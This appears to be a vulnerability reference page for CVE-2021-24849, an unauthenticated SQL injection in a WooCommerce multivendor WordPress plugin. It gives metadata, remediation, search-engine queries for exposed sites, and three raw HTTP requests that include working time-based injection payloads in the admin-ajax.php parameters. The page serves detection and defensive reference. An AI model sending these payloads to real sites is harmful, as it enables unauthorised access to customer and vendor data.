---
layout: post
cve_id: CVE-2021-24849
title: WCFM WooCommerce Multivendor Marketplace < 3.4.12 - SQL Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24849.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24849.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Unauthenticated attackers can execute SQL injection through multiple unsanitized
  parameters, potentially gaining access to all WooCommerce marketplace data including
  customer and vendor information.

  '
remediation: Fixed in 3.4.12
reference:
- https://wpscan.com/vulnerability/763c08a0-4b2b-4487-b91c-be6cc2b9322e/
- https://nvd.nist.gov/vuln/detail/CVE-2021-24849
- https://wordpress.org/plugins/wc-multivendor-marketplace/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-24849
  cwe-id: CWE-89
  epss-score: 0.6198
  epss-percentile: 0.98272
  cpe: cpe:2.3:a:wclovers:frontend_manager_for_woocommerce_along_with_bookings_subscription_listings_compatible:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 3
  vendor: wclovers
  product: frontend_manager_for_woocommerce_along_with_bookings_subscription_listings_compatible
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/wc-multivendor-marketplace
  fofa-query: body=/wp-content/plugins/wc-multivendor-marketplace
  publicwww-query: /wp-content/plugins/wc-multivendor-marketplace
tags:
- time-based-sqli
- wpscan
- cve
- cve2021
- wp
- wp-plugin
- wordpress
- wc-multivendor-marketplace
- sqli
- wclovers
- vuln
---

## ðŸ” Vulnerability Description
The wcfm_ajax_controller AJAX action of the WCFM Marketplace WordPress plugin before 3.4.12, available to unauthenticated and authenticated user, does not properly sanitise multiple parameters before using them in SQL statements, leading to SQL injections.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-content/plugins/wc-multivendor-marketplace/readme.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Length: 106
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
action=wcfm_ajax_controller&controller=wcfm-refund-requests&transaction_id=1+union+select+1+and+sleep(5)--
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2 rv:2.0; mai-IN) AppleWebKit/533.27.1 (KHTML, like Gecko) Version/5.0 Safari/533.27.1
Content-Length: 145
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
action=wcfm_ajax_controller&controller=wcfm-refund-requests&transaction_id=1&orderby=ID`%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(5)))b)--%20`
```

